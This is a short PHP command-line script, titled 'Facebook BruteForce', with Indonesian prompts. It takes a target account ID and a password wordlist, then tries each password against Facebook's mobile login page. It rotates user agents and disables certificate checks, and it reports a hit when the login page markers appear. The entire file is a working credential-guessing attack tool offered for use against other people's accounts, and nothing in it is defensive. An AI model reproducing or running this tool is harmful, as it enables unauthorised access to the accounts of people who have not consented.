<?php
error_reporting(0);
/*
  * Facebook BruteForce
  * 5 juli 2019
*/
function check($user, $pass) {
	$fileua = 'user-agents.txt';
	$useragent = $fileua[rand(0, count($fileua) - 1)];
	$kuki = 'kuki.txt';
	touch($kuki);
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass.'&login=Login');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $kuki);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $kuki);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
	$output = curl_exec($ch) or die('Can\'t access '.$url);
	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
		return TRUE;
	} else {
		return FALSE;
	}
}
$nc="\e[0m";
$white="\e[1;37m";
$black="\e[0;30m";
$blue="\e[0;34m";
$light_blue="\e[1;34m";
$green="\e[0;32m";
$light_green="\e[1;32m";
$cyan="\e[0;36m";
$light_cyan="\e[1;36m";
$red="\e[0;31m";
$light_red="\e[1;31m";
$purple="\e[0;35m";
$light_purple="\e[1;35m";
$brown="\e[0;33m";
$yellow="\e[1;33m";
$gray="\e[0;30m";
$light_gray="\e[0;37m";
$banner = $red." _____ ____    ____  _____
|  ___| __ )  | __ )|  ___|
| |_  |  _ \  |  _ \| |_".$nc."
|  _| | |_) | | |_) |  _|
|_|   |____/  |____/|_|
".$blue."Facebook Bruteforce
".$cyan."Coded: ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ\n\n".$nc;
$file = $_SERVER[argv][1];
echo "$white Masukkan ID Target:$yellow ";
$user = trim(fgets(STDIN));
echo "$white Tulis password.txt:$yellow ";
$wordlist = trim(fgets(STDIN));
if(!empty($user) && !empty($wordlist)) {
	$passlist = file($wordlist);
	$passcount = count($passlist);
	print $banner;
	print "Checking ".$yellow.$passcount." password..\n".$nc;
	foreach($passlist as $password) {
		$pass = substr($password, 0, strlen($password) - 1);
		if(check(urlencode($user), urlencode($pass))) {
			print $pass." => ".$green."Ini Benar\n".$nc;
		} else {
			print $pass." => ".$red."Maaf Anda Salah\n".$nc;
		}
	}
} else {
	print $banner;
	print "
Usage: php ".$file." [username] [wordlist]";
}
?>